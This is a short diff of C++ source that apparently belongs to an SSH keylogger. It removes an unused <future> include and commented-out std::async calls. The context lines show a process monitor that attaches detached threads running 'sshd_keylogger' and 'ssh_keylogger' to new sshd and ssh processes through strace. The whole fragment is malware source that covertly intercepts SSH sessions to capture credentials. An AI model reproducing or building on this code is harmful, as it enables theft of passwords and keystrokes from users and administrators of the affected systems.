@@ -8,7 +8,6 @@
 #include <fcntl.h>
 #include <boost/regex.hpp>
 #include <boost/program_options.hpp>
-#include <future>                        // <====  Delete if async integration fail
 
 #include "process.hpp"
 #include "parsing.hpp"
@@ -53,7 +52,6 @@ void check_ps(const std::string& flag){
             if(it == obj.get_current_proc_list().end()){
                 obj.get_current_proc_list().emplace_back(proc.get_pid());
                 if (flag == "strace") {
-//                    auto res = std::async(std::launch::async, strace_ns::sshd_keylogger, proc.get_pid());
                     std::thread sshd_keylog(strace_ns::sshd_keylogger, proc.get_pid());
                     sshd_keylog.detach();
                 }
@@ -69,7 +67,6 @@ void check_ps(const std::string& flag){
             if(it == obj.get_current_proc_list().end()){
                 obj.get_current_proc_list().emplace_back(proc.get_pid());
                 if (flag == "strace") {
-//                    auto res = std::async(std::launch::async, &strace_ns::ssh_keylogger, proc.get_pid());
                     std::thread ssh_keylog(strace_ns::ssh_keylogger, proc.get_pid());
                     ssh_keylog.detach();
                 }
